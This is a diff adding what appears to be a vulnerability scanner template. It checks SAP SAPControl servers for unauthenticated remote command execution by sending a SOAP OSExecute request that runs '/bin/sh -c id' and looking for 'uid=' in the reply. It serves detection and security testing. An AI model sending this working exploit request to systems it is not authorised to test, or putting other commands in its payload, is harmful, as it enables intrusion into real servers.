@@ -1,0 +1,55 @@
+id: sap-sapcontrol-osexecute-unauth-rce
+
+info:
+  name: SAPControl - OSExecute unauthenticated RCE
+  author: LRVT <https://github.com/l4rm4nd>
+  severity: critical
+  tags: sap,sapcontrol,soap,rce,osexecute
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Content-Type: text/xml; charset=UTF-8
+      SOAPAction: '""'
+      User-Agent: Mozilla/5.0
+
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
+        <SOAP-ENV:Header>
+          <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
+            <enableSession>true</enableSession>
+          </sapsess:Session>
+        </SOAP-ENV:Header>
+        <SOAP-ENV:Body>
+          <ns1:OSExecute xmlns:ns1="urn:SAPControl">
+            <command>/bin/sh -c id</command>
+            <async>0</async>
+          </ns1:OSExecute>
+        </SOAP-ENV:Body>
+      </SOAP-ENV:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "OSExecuteResponse"
+          - "<output>"
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\("
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "AccessDenied"
+          - "Invalid Credentials"
+          - "not authorized"
